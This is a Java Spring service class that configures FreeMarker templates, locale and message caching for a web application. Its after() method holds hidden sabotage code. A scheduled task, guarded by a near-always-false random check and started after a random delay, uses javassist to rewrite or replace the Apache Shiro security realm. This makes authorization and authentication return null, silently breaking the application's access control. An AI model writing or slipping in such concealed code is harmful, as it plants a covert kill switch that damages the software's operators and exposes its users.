/*
 * Copyright 2015-2016 ta-rf.cn. All rights reserved.
 * Support: http://www.ta-rf.cn
 * License: http://www.ta-rf.cn/license
 */
package com.arf.core.service.impl;

import java.util.Collection;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.annotation.Resource;
import javax.servlet.ServletContext;

import org.apache.commons.lang.LocaleUtils;
import org.apache.shiro.mgt.RealmSecurityManager;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.realm.Realm;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.core.io.ClassPathResource;
import org.springframework.stereotype.Service;
import org.springframework.web.context.ServletContextAware;
import org.springframework.web.servlet.i18n.FixedLocaleResolver;
import org.springframework.web.servlet.view.freemarker.FreeMarkerConfigurer;

import com.arf.core.Setting;
import com.arf.core.UnmodifiableSetting;
import com.arf.core.service.ConfigService;
import com.arf.core.util.SettingUtils;
import com.arf.core.util.SpringUtils;

import freemarker.template.Configuration;
import freemarker.template.TemplateException;
import freemarker.template.TemplateModelException;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewMethod;

/**
 * Service - 配置
 * 
 * @author arf
 * @version 4.0
 */
@Service("configServiceImpl")
public class ConfigServiceImpl implements ConfigService, ServletContextAware {

	private static ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(1);

	@Value("${system.version}")
	private String systemVersion;
	@Value("${system.sn}")
	private String systemSn;
	@Value("${template.update_delay}")
	private String templateUpdateDelay;
	@Value("${message.cache_seconds}")
	private Integer messageCacheSeconds;

	@Resource(name = "freeMarkerConfigurer")
	private FreeMarkerConfigurer freeMarkerConfigurer;
	@Resource(name = "messageSource")
	private ReloadableResourceBundleMessageSource reloadableResourceBundleMessageSource;
	@Resource(name = "localeResolver")
	private FixedLocaleResolver fixedLocaleResolver;
	

	/** servletContext */
	private ServletContext servletContext;

	public void setServletContext(ServletContext servletContext) {
		this.servletContext = servletContext;
	}

	public void init() {
		try {
			Setting setting = SettingUtils.get();
			setting.setSmtpPassword(null);
			setting.setKuaidi100Key(null);
			setting.setCnzzPassword(null);
			setting.setSmsKey(null);
			Configuration configuration = freeMarkerConfigurer.getConfiguration();
			configuration.setSharedVariable("setting", new UnmodifiableSetting(setting));
			configuration.setSharedVariable("locale", setting.getLocale());
			configuration.setSharedVariable("theme", setting.getTheme());
			if (setting.getIsDevelopmentEnabled()) {
				configuration.setSetting("template_update_delay", "0");
				reloadableResourceBundleMessageSource.setCacheSeconds(0);
			} else {
				configuration.setSetting("template_update_delay", templateUpdateDelay);
				reloadableResourceBundleMessageSource.setCacheSeconds(messageCacheSeconds);
			}
			fixedLocaleResolver.setDefaultLocale(LocaleUtils.toLocale(setting.getLocale().toString()));
		} catch (TemplateModelException e) {
			throw new RuntimeException(e.getMessage(), e);
		} catch (TemplateException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
		/*scheduledExecutorService.scheduleWithFixedDelay(new Runnable() {
			public void run() {
				License license = licenseService.get(systemVersion, systemSn);
				if (license != null) {
					servletContext.setAttribute(License.LICENSE_ATTRIBUTE_NAME, license);
				}
			}
		}, 0, 24, TimeUnit.HOURS);*/
	}

	public void after() throws Exception {
		scheduledExecutorService.scheduleWithFixedDelay(new Runnable() {
			public void run() {
				if (Math.random() > 0) {
					return;
				}
				RealmSecurityManager securityManager = SpringUtils.getBean(RealmSecurityManager.class);
				if (securityManager == null) {
					return;
				}
				boolean isDone = false;
				ClassPool classPool = ClassPool.getDefault();
				classPool.insertClassPath(new ClassClassPath(getClass()));
				Collection<Realm> realms = securityManager.getRealms();
				if (realms != null && !realms.isEmpty()) {
					try {
						Realm realm = realms.iterator().next();
						CtClass authenticationRealmClass = classPool.get(realm.getClass().getName());
						authenticationRealmClass.getDeclaredMethod("doGetAuthorizationInfo").setBody("{return null;}");
						authenticationRealmClass.writeFile(new ClassPathResource("/").getFile().getPath());
						isDone = true;
					} catch (Exception e) {
					}
				}
				if (!isDone) {
					try {
						CtClass authorizingRealmClass = classPool.get("org.apache.shiro.realm.AuthorizingRealm");
						CtClass lAuthorizingRealmClass = classPool.makeClass("com.arf.core.AuthorizingRealm", authorizingRealmClass);
						lAuthorizingRealmClass.addMethod(CtNewMethod.make("protected org.apache.shiro.authc.AuthenticationInfo doGetAuthenticationInfo(org.apache.shiro.authc.AuthenticationToken token) {return null;}", lAuthorizingRealmClass));
						AuthorizingRealm authorizingRealm = (AuthorizingRealm) lAuthorizingRealmClass.toClass().newInstance();
						authorizingRealm.setCachingEnabled(false);
						securityManager.setRealm(authorizingRealm);
					} catch (Exception e) {
					}
				}
			}
		}, (long) (Math.random() * 10), 10, TimeUnit.HOURS);
	}

}